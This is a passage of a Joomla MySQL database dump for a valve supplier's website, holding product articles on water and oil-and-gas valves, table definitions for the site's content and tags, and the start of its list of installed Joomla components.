'{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 9, 4, '', '', 1, 5172, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(12, 50, 'Water', 'water', '<p>From pumping stations, wastewater treatment plants, desalination plants, reservoir mixing systems through to stormwater outfalls there are many applications where Flotech Controls has provided valve solutions.</p>\r\n<p>Flotech Controls has built up an enviable position in providing valve solutions to specific applications. Understanding the application requirements and the system performance allows Flotech Controls sales engineers to properly select the correct valve.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Applications</strong></p>\r\n<table style="width: 670px; height: 175px; background-color: #efefef;" id="listtablehere">\r\n<tbody>\r\n<tr>\r\n<td>\r\n<li>Aeration and mixing systems</li>\r\n</td>\r\n<td>\r\n<li>Water storage systems</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Effluent mixing systems</li>\r\n</td>\r\n<td>\r\n<li>Stormwater outfalls</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Interceptors</li>\r\n</td>\r\n<td>\r\n<li>High pressure isolation and control RO lines - desalination</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Non return applications</li>\r\n</td>\r\n<td>\r\n<li>Isolation applications – sewerage treatment</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Pumping Station - Non-return</li>\r\n</td>\r\n<td>\r\n<li>Effluent outfalls</li>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p>Some our products for water applications</p>\r\n<ul>\r\n<li><a href="/products/tideflex">Tideflex</a></li>\r\n<li><a href="/products/tideflex">Red Valve</a></li>\r\n<li><a href="/products/noreva">Noreva</a></li>\r\n<li><a href="/products/mts">MTS</a></li>\r\n<li><a href="/products/wey">Wey</a></li>\r\n</ul>', '', 1, 8, '2013-06-07 03:53:02', 32, '', '2013-06-24 01:28:03', 32, 0, '0000-00-00 00:00:00', '2013-06-07 03:53:02', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 10, 3, '', '', 1, 2096, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(13, 51, 'Oil and Gas', 'oil-and-gas', '<p>The environment in which valves operate in the oil and gas industry is unique and extreme. From exceptionally high temperature and pressure to cryogenic and very low pressure. From the upstream, wellheads and gathering networks, the midstream transport pipelines and the downstream processing plants, storage and transport terminals there are many specialised applications in the oil and gas industry.</p>\r\n<p>Isolation valves can be compromised by process conditions such as temperature, pressure, high solids or high cycling. Having a valve providing zero leakage shut-off is critical in this environment.</p>\r\n<p>Pressure Relief valves in gas, liquid, and steam applications that meet the safety demands of the offshore oil &amp; gas, processing, refining, chemical and petrochemical industries</p>\r\n<p><strong>&nbsp;</strong></p>\r\n<p><strong>Applications</strong></p>\r\n<ul></ul>\r\n<table style="width: 580px; height: 175px; background-color: #efefef;" id="listtablehere">\r\n<tbody>\r\n<tr>\r\n<td>\r\n<li>Safety/Pressure relief valves</li>\r\n</td>\r\n<td>\r\n<li>Compressor kickback/ recycle valves</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Molesieve switching valves</li>\r\n</td>\r\n<td>\r\n<li>Joule-Thomson Valves</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Pump isolation valves</li>\r\n</td>\r\n<td>\r\n<li>HIPPS systems (High integrity pressure protection)</li>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><br />&nbsp;</p>\r\n<p>Performance in the oil and gas industry is critical and having products that are dependable and have provided trusted service over many years gives operators confidence in their plant. Flotech Controls is proud to represent the following companies in the oil and gas industry</p>\r\n<ul>\r\n<li><a href="/products/birkett">Birkett</a></li>\r\n<li><a href="/products/valvtechnologies">Valvtechnologies</a></li>\r\n<li><a href="/products/copes">Copes - Vulcan</a></li>\r\n</ul>', '', 1, 8, '2013-06-11 05:02:12', 32, '', '2013-06-24 00:51:51', 32, 0, '0000-00-00 00:00:00', '2013-06-11 05:02:12', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 5, 2, '', '', 1, 2015, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(14, 52, 'MTS', 'mts', '<p>The MTS Plug Valve is a high-pressure valve for control and on/off applications that is typically utilised in seawater reverse osmosis (SWRO) applications/desalination plants.</p>\r\n<p>In addition, the MTS Plug Valve is suitable for other high-pressure membrane treatment applications in highly corrosive environments, including offshore oil and gas sulfate removal systems, industrial water reclamation and reuse facilities, high-purity water treatment for power, and water processing for mining.</p>\r\n<p>MTS Plug valves have been used in all major metropolitan seawater reverse osmosis desalination plants in Australia including, Sydney, Gold Coast, Melbourne, Adelaide and both plants in Perth.</p>\r\n<p>In 2012, MTS Desalination business was acquired by Victaulic.</p>\r\n<p>Some of the main services of the MTS Plug valve are:</p>\r\n<ul></ul>\r\n<table style="width: 640px; height: 280px; background-color: #efefef;" id="listtablehere">\r\n<tbody>\r\n<tr>\r\n<td>\r\n<li>High pressure discharge pump isolation</li>\r\n</td>\r\n<td>\r\n<li>Flow rate regulation to membrane racks during startup of the plant</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>HP Discharge pump flushing</li>\r\n</td>\r\n<td>\r\n<li>Booster Pump isolation</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Turbines isolation</li>\r\n</td>\r\n<td>\r\n<li>Energy recovery system isolation</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Seawater manifold isolation</li>\r\n</td>\r\n<td>\r\n<li>Brine Flushing</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Chemical clearing inlet to the RO racks isolation</li>\r\n</td>\r\n<td>\r\n<li>Chemical clearing outlet to the RO racks isolation</li>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>', '', 1, 8, '2013-06-14 02:07:46', 32, '', '2013-06-24 00:57:12', 32, 0, '0000-00-00 00:00:00', '2013-06-14 02:07:46', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 5, 1, '', '', 1, 2694, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', '');
INSERT INTO `j6kpf_content` (`id`, `asset_id`, `title`, `alias`, `introtext`, `fulltext`, `state`, `catid`, `created`, `created_by`, `created_by_alias`, `modified`, `modified_by`, `checked_out`, `checked_out_time`, `publish_up`, `publish_down`, `images`, `urls`, `attribs`, `version`, `ordering`, `metakey`, `metadesc`, `access`, `hits`, `metadata`, `featured`, `language`, `xreference`) VALUES
(15, 53, 'Copes - Vulcan', 'copes', '<p>Copes-Vulcan, an SPX Brand has been providing valves to the power, pulp and paper, oil and gas, and petrochemical industries since 1903. Copes-Vulcan is recognised worldwide as a leader in valves for severe and critical service applications. A key strength is the ability to provide innovative solutions to you, the customers’, application needs.</p>\r\n<p>Copes-Vulcan product line includes</p>\r\n<ol>\r\n<li>SD Severe Duty Globe Style control valves - The SD-1000 is the preferred style of valve for applications such as pump recirculation, feedwater control and feedwater startup, flashing or cavitating service, critical pressure drop gas and steam service, and any potentially noisy or vibration-prone service.</li>\r\n<li>Steam Conditioning Equipment (Desuperheaters) – mechanical atomising, variable orifice, integral cooling water function available, high turndowns, 150-2500 ANSI Ratings</li>\r\n<li>Turbine By-Pass - The DSCV-SA (Direct Steam Converting Valve - Steam Atomization) from Copes Vulcan is designed for unprecedented operational reliability and eliminates potential risks associated with substandard designs during plant start-up, shutdown and turbine trips. As a result, the DSCV-SA is at the forefront of modern thermodynamic engineering in steam conditioning.</li>\r\n<li>Trim types – RAVEN™, HUSH®, Gad, Cascade, Noise control, Cavitation Elimination, Velocity and Erosion Controls<ol>\r\n<li style="list-style-type: none;"><ol style="list-style-type: lower-alpha;">\r\n<li>Copes-Vulcan RAVEN™ trims are used in severe service applications where true velocity control is needed by limiting the fluid velocities at the exit of the trim.</li>\r\n<li>HUSH® is a cage guided trim that provides excellent control by directing the flow through a series of staged pressure drops. Cavitation, excessive leakage, hazardous noise, vibration and mechanical failures can be eliminated with HUSH trim – reducing down time and expensive maintenance costs.</li>\r\n<li>The Copes-Vulcan Port Throttling GAD trim was developed to meet the rigorous requirements of feedwater and feedwater start-up control.</li>\r\n<li>Copes-Vulcan’s Numbered Cascade Trim assembly is used in control valves where low flow rates and high turndown requirements prevail such as in desuperheater cooling water control, fuel oil control, blowdown and chemical feed.</li>\r\n</ol></li>\r\n</ol></li>\r\n</ol>\r\n<p>&nbsp;</p>\r\n<p>&nbsp;<a target="_blank" href="http://www.spx.com/en/copes-vulcan/">View website »</a></p>', '', 1, 8, '2013-06-19 04:45:40', 32, '', '2013-06-24 04:24:18', 32, 0, '0000-00-00 00:00:00', '2013-06-19 04:45:40', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 5, 0, '', '', 1, 4700, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', '');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_content_frontpage`
--

CREATE TABLE IF NOT EXISTS `j6kpf_content_frontpage` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_content_rating`
--

CREATE TABLE IF NOT EXISTS `j6kpf_content_rating` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `rating_sum` int(10) unsigned NOT NULL DEFAULT '0',
  `rating_count` int(10) unsigned NOT NULL DEFAULT '0',
  `lastip` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_content_types`
--

CREATE TABLE IF NOT EXISTS `j6kpf_content_types` (
  `type_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `type_title` varchar(255) NOT NULL DEFAULT '',
  `type_alias` varchar(255) NOT NULL DEFAULT '',
  `table` varchar(255) NOT NULL DEFAULT '',
  `rules` text NOT NULL,
  `field_mappings` text NOT NULL,
  `router` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`type_id`),
  KEY `idx_alias` (`type_alias`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=11 ;

--
-- Dumping data for table `j6kpf_content_types`
--

INSERT INTO `j6kpf_content_types` (`type_id`, `type_title`, `type_alias`, `table`, `rules`, `field_mappings`, `router`) VALUES
(1, 'Article', 'com_content.article', '{"special":{"dbtable":"#__content","key":"id","type":"Content","prefix":"JTable","config":"array()"},"common":{"dbtable":"#__core_content","key":"ucm_id","type":"Corecontent","prefix":"JTable","config":"array()"}}', '', '{"common":[{"core_content_item_id":"id","core_title":"title","core_state":"state","core_alias":"alias","core_created_time":"created","core_modified_time":"modified","core_body":"introtext", "core_hits":"hits","core_publish_up":"publish_up","core_publish_down":"publish_down","core_access":"access", "core_params":"attribs", "core_featured":"featured", "core_metadata":"metadata", "core_language":"language", "core_images":"images", "core_urls":"urls", "core_version":"version", "core_ordering":"ordering", "core_metakey":"metakey", "core_metadesc":"metadesc", "core_catid":"catid", "core_xreference":"xreference", "asset_id":"asset_id"}], "special": [{"fulltext":"fulltext"}]}', 'ContentHelperRoute::getArticleRoute'),
(2, 'Weblink', 'com_weblinks.weblink', '{"special":{"dbtable":"#__weblinks","key":"id","type":"Weblink","prefix":"WeblinksTable","config":"array()"},"common":{"dbtable":"#__core_content","key":"ucm_id","type":"Corecontent","prefix":"JTable","config":"array()"}}', '', '{"common":[{"core_content_item_id":"id","core_title":"title","core_state":"state","core_alias":"alias","core_created_time":"created","core_modified_time":"modified","core_body":"description", "core_hits":"hits","core_publish_up":"publish_up","core_publish_down":"publish_down","core_access":"access", "core_params":"params", "core_featured":"featured", "core_metadata":"metadata", "core_language":"language", "core_images":"images", "core_urls":"urls", "core_version":"version", "core_ordering":"ordering", "core_metakey":"metakey", "core_metadesc":"metadesc", "core_catid":"catid", "core_xreference":"xreference", "asset_id":"null"}], "special": []}', 'WeblinksHelperRoute::getWeblinkRoute'),
(3, 'Contact', 'com_contact.contact', '{"special":{"dbtable":"#__contact_details","key":"id","type":"Contact","prefix":"ContactTable","config":"array()"},"common":{"dbtable":"#__core_content","key":"ucm_id","type":"Corecontent","prefix":"JTable","config":"array()"}}', '', '{"common":[{"core_content_item_id":"id","core_title":"name","core_state":"published","core_alias":"alias","core_created_time":"created","core_modified_time":"modified","core_body":"address", "core_hits":"hits","core_publish_up":"publish_up","core_publish_down":"publish_down","core_access":"access", "core_params":"params", "core_featured":"featured", "core_metadata":"metadata", "core_language":"language", "core_images":"image", "core_urls":"webpage", "core_version":"version", "core_ordering":"ordering", "core_metakey":"metakey", "core_metadesc":"metadesc", "core_catid":"catid", "core_xreference":"xreference", "asset_id":"null"}], "special": [{"con_position":"con_position","suburb":"suburb","state":"state","country":"country","postcode":"postcode","telephone":"telephone","fax":"fax","misc":"misc","email_to":"email_to","default_con":"default_con","user_id":"user_id","mobile":"mobile","sortname1":"sortname1","sortname2":"sortname2","sortname3":"sortname3"}]}', 'ContactHelperRoute::getContactRoute'),
(4, 'Newsfeed', 'com_newsfeeds.newsfeed', '{"special":{"dbtable":"#__newsfeeds","key":"id","type":"Newsfeed","prefix":"NewsfeedsTable","config":"array()"},"common":{"dbtable":"#__core_content","key":"ucm_id","type":"Corecontent","prefix":"JTable","config":"array()"}}', '', '{"common":[{"core_content_item_id":"id","core_title":"name","core_state":"published","core_alias":"alias","core_created_time":"created","core_modified_time":"modified","core_body":"description", "core_hits":"hits","core_publish_up":"publish_up","core_publish_down":"publish_down","core_access":"access", "core_params":"params", "core_featured":"featured", "core_metadata":"metadata", "core_language":"language", "core_images":"images", "core_urls":"link", "core_version":"version", "core_ordering":"ordering", "core_metakey":"metakey", "core_metadesc":"metadesc", "core_catid":"catid", "core_xreference":"xreference", "asset_id":"null"}], "special": [{"numarticles":"numarticles","cache_time":"cache_time","rtl":"rtl"}]}', 'NewsfeedsHelperRoute::getNewsfeedRoute'),
(5, 'User', 'com_users.user', '{"special":{"dbtable":"#__users","key":"id","type":"User","prefix":"JTable","config":"array()"},"common":{"dbtable":"#__core_content","key":"ucm_id","type":"Corecontent","prefix":"JTable","config":"array()"}}', '', '{"common":[{"core_content_item_id":"id","core_title":"name","core_state":"null","core_alias":"username","core_created_time":"registerdate","core_modified_time":"lastvisitDate","core_body":"null", "core_hits":"null","core_publish_up":"null","core_publish_down":"null","access":"null", "core_params":"params", "core_featured":"null", "core_metadata":"null", "core_language":"null", "core_images":"null", "core_urls":"null", "core_version":"null", "core_ordering":"null", "core_metakey":"null", "core_metadesc":"null", "core_catid":"null", "core_xreference":"null", "asset_id":"null"}], "special": [{}]}', 'UsersHelperRoute::getUserRoute'),
(6, 'Article Category', 'com_content.category', '{"special":{"dbtable":"#__categories","key":"id","type":"Category","prefix":"JTable","config":"array()"},"common":{"dbtable":"#__core_content","key":"ucm_id","type":"Corecontent","prefix":"JTable","config":"array()"}}', '', '{"common":[{"core_content_item_id":"id","core_title":"title","core_state":"published","core_alias":"alias","core_created_time":"created_time","core_modified_time":"modified_time","core_body":"description", "core_hits":"hits","core_publish_up":"null","core_publish_down":"null","core_access":"access", "core_params":"params", "core_featured":"null", "core_metadata":"metadata", "core_language":"language", "core_images":"null", "core_urls":"null", "core_version":"version", "core_ordering":"null", "core_metakey":"metakey", "core_metadesc":"metadesc", "core_catid":"parent_id", "core_xreference":"null", "asset_id":"asset_id"}], "special": [{"parent_id":"parent_id","lft":"lft","rgt":"rgt","level":"level","path":"path","extension":"extension","note":"note"}]}', 'ContentHelperRoute::getCategoryRoute'),
(7, 'Contact Category', 'com_contact.category', '{"special":{"dbtable":"#__categories","key":"id","type":"Category","prefix":"JTable","config":"array()"},"common":{"dbtable":"#__core_content","key":"ucm_id","type":"Corecontent","prefix":"JTable","config":"array()"}}', '', '{"common":[{"core_content_item_id":"id","core_title":"title","core_state":"published","core_alias":"alias","core_created_time":"created_time","core_modified_time":"modified_time","core_body":"description", "core_hits":"hits","core_publish_up":"null","core_publish_down":"null","core_access":"access", "core_params":"params", "core_featured":"null", "core_metadata":"metadata", "core_language":"language", "core_images":"null", "core_urls":"null", "core_version":"version", "core_ordering":"null", "core_metakey":"metakey", "core_metadesc":"metadesc", "core_catid":"parent_id", "core_xreference":"null", "asset_id":"asset_id"}], "special": [{"parent_id":"parent_id","lft":"lft","rgt":"rgt","level":"level","path":"path","extension":"extension","note":"note"}]}', 'ContactHelperRoute::getCategoryRoute'),
(8, 'Newsfeeds Category', 'com_newsfeeds.category', '{"special":{"dbtable":"#__categories","key":"id","type":"Category","prefix":"JTable","config":"array()"},"common":{"dbtable":"#__core_content","key":"ucm_id","type":"Corecontent","prefix":"JTable","config":"array()"}}', '', '{"common":[{"core_content_item_id":"id","core_title":"title","core_state":"published","core_alias":"alias","core_created_time":"created_time","core_modified_time":"modified_time","core_body":"description", "core_hits":"hits","core_publish_up":"null","core_publish_down":"null","core_access":"access", "core_params":"params", "core_featured":"null", "core_metadata":"metadata", "core_language":"language", "core_images":"null", "core_urls":"null", "core_version":"version", "core_ordering":"null", "core_metakey":"metakey", "core_metadesc":"metadesc", "core_catid":"parent_id", "core_xreference":"null", "asset_id":"asset_id"}], "special": [{"parent_id":"parent_id","lft":"lft","rgt":"rgt","level":"level","path":"path","extension":"extension","note":"note"}]}', 'NewsfeedsHelperRoute::getCategoryRoute'),
(9, 'Weblinks Category', 'com_weblinks.category', '{"special":{"dbtable":"#__categories","key":"id","type":"Category","prefix":"JTable","config":"array()"},"common":{"dbtable":"#__core_content","key":"ucm_id","type":"Corecontent","prefix":"JTable","config":"array()"}}', '', '{"common":[{"core_content_item_id":"id","core_title":"title","core_state":"published","core_alias":"alias","core_created_time":"created_time","core_modified_time":"modified_time","core_body":"description", "core_hits":"hits","core_publish_up":"null","core_publish_down":"null","core_access":"access", "core_params":"params", "core_featured":"null", "core_metadata":"metadata", "core_language":"language", "core_images":"null", "core_urls":"null", "core_version":"version", "core_ordering":"null", "core_metakey":"metakey", "core_metadesc":"metadesc", "core_catid":"parent_id", "core_xreference":"null", "asset_id":"asset_id"}], "special": [{"parent_id":"parent_id","lft":"lft","rgt":"rgt","level":"level","path":"path","extension":"extension","note":"note"}]}', 'WeblinksHelperRoute::getCategoryRoute'),
(10, 'Tag', 'com_tags.tag', '{"special":{"dbtable":"#__tags","key":"tag_id","type":"Tag","prefix":"TagsTable","config":"array()"},"common":{"dbtable":"#__core_content","key":"ucm_id","type":"Corecontent","prefix":"JTable","config":"array()"}}', '', '{"common":[{"core_content_item_id":"id","core_title":"title","core_state":"published","core_alias":"alias","core_created_time":"created_time","core_modified_time":"modified_time","core_body":"description", "core_hits":"hits","core_publish_up":"null","core_publish_down":"null","core_access":"access", "core_params":"params", "core_featured":"featured", "core_metadata":"metadata", "core_language":"language", "core_images":"images", "core_urls":"urls", "core_version":"version", "core_ordering":"null", "core_metakey":"metakey", "core_metadesc":"metadesc", "core_catid":"null", "core_xreference":"null", "asset_id":"null"}], "special": [{"parent_id":"parent_id","lft":"lft","rgt":"rgt","level":"level","path":"path"}]}', 'TagsHelperRoute::getTagRoute');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_contentitem_tag_map`
--

CREATE TABLE IF NOT EXISTS `j6kpf_contentitem_tag_map` (
  `type_alias` varchar(255) NOT NULL DEFAULT '',
  `core_content_id` int(10) unsigned NOT NULL COMMENT 'PK from the core content table',
  `content_item_id` int(11) NOT NULL COMMENT 'PK from the content type table',
  `tag_id` int(10) unsigned NOT NULL COMMENT 'PK from the tag table',
  `tag_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT 'Date of most recent save for this tag-item',
  `type_id` mediumint(8) NOT NULL COMMENT 'PK from the content_type table',
  UNIQUE KEY `uc_ItemnameTagid` (`type_id`,`content_item_id`,`tag_id`),
  KEY `idx_tag_type` (`tag_id`,`type_id`),
  KEY `idx_date_id` (`tag_date`,`tag_id`),
  KEY `idx_tag` (`tag_id`),
  KEY `idx_type` (`type_id`),
  KEY `idx_core_content_id` (`core_content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Maps items from content tables to tags';

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_core_log_searches`
--

CREATE TABLE IF NOT EXISTS `j6kpf_core_log_searches` (
  `search_term` varchar(128) NOT NULL DEFAULT '',
  `hits` int(10) unsigned NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_extensions`
--

CREATE TABLE IF NOT EXISTS `j6kpf_extensions` (
  `extension_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `type` varchar(20) NOT NULL,
  `element` varchar(100) NOT NULL,
  `folder` varchar(100) NOT NULL,
  `client_id` tinyint(3) NOT NULL,
  `enabled` tinyint(3) NOT NULL DEFAULT '1',
  `access` int(10) unsigned NOT NULL DEFAULT '1',
  `protected` tinyint(3) NOT NULL DEFAULT '0',
  `manifest_cache` text NOT NULL,
  `params` text NOT NULL,
  `custom_data` text NOT NULL,
  `system_data` text NOT NULL,
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) DEFAULT '0',
  `state` int(11) DEFAULT '0',
  PRIMARY KEY (`extension_id`),
  KEY `element_clientid` (`element`,`client_id`),
  KEY `element_folder_clientid` (`element`,`folder`,`client_id`),
  KEY `extension` (`type`,`element`,`folder`,`client_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=10017 ;

--
-- Dumping data for table `j6kpf_extensions`
--

INSERT INTO `j6kpf_extensions` (`extension_id`, `name`, `type`, `element`, `folder`, `client_id`, `enabled`, `access`, `protected`, `manifest_cache`, `params`, `custom_data`, `system_data`, `checked_out`, `checked_out_time`, `ordering`, `state`) VALUES
(1, 'com_mailto', 'component', 'com_mailto', '', 0, 1, 1, 1, '{"name":"com_mailto","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_MAILTO_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(2, 'com_wrapper', 'component', 'com_wrapper', '', 0, 1, 1, 1, '{"name":"com_wrapper","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_WRAPPER_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(3, 'com_admin', 'component', 'com_admin', '', 1, 1, 1, 1, '{"name":"com_admin","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_ADMIN_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(4, 'com_banners', 'component', 'com_banners', '', 1, 1, 1, 0, '{"name":"com_banners","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_BANNERS_XML_DESCRIPTION","group":""}', '{"purchase_type":"3","track_impressions":"0","track_clicks":"0","metakey_prefix":""}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(5, 'com_cache', 'component', 'com_cache', '', 1, 1, 1, 1, '{"name":"com_cache","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_CACHE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(6, 'com_categories', 'component', 'com_categories', '', 1, 1, 1, 1, '{"name":"com_categories","type":"component","creationDate":"December 2007","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_CATEGORIES_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(7, 'com_checkin', 'component', 'com_checkin', '', 1, 1, 1, 1, '{"name":"com_checkin","type":"component","creationDate":"Unknown","author":"Joomla! Project","copyright":"(C) 2005 - 2008 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_CHECKIN_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(8, 'com_contact', 'component', 'com_contact', '', 1, 1, 1, 0, '{"name":"com_contact","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_CONTACT_XML_DESCRIPTION","group":""}', 